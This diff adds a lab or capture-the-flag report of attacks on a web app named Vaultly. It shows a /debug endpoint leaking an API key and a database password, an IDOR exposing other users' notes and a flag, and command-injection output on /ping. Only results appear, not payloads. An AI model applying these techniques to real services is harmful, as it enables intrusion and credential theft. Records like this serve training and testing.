@@ -1,0 +1,25 @@
+
+=== 0. Fingerprint ============================================
+Vaultly 1.4.2
+  GET /debug                service diagnostics
+  GET /api/note?id=N        read a note
+  GET /ping?host=HOST       connectivity check
+
+=== 1. Exposed /debug leaks secrets ===========================
+HTTP 200
+  api_key     = vault_live_9f2c41a7d8be4f0e9c6a1b3d5e7f8a90
+  db_password = Pr0d-Vaultly-2019!
+
+=== 2. IDOR: read other users' notes ==========================
+  id=1 owner=alice  remember to rotate the staging key
+  id=2 owner=admin  flag{idor_is_the_most_common_web_bug}
+  id=3 owner=alice  lunch on friday?
+
+=== 3. Command injection on /ping =============================
+  uid=1000(kennethlari) gid=1000(kennethlari) groups=1000(kennethlari),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(scanner),108(wireshark),116(kaboxer),965(vboxsf),977(bluetooth),989(netdev),999(lpadmin)
+  Linux kali 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.1.5-1kali1 (2026-07-29) x86_64 GNU/Linux
+
+=== Result ====================================================
+  flag        : flag{idor_is_the_most_common_web_bug}
+  RCE         : yes
+  secrets     : 5 fields exposed at /debug
